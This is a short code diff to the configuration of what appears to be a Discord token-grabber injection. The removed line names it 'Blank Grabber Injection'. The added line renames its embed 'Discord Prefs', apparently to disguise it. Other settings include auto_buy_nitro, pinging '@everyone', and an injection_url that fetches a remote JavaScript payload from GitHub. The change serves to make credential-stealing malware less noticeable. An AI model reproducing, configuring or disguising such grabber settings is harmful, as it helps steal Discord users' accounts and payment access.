@@ -12,7 +12,7 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone', 
-  embed_name: 'Blank Grabber Injection', 
+  embed_name: 'Discord Prefs', 
   embed_icon: 'https://raw.githubusercontent.com/Re-Edit/papa/refs/heads/main/scr.jpg',
   embed_color: 5639644, 
   injection_url: 'https://raw.githubusercontent.com/Re-Edit/lister/refs/heads/main/status-scanner.js', 
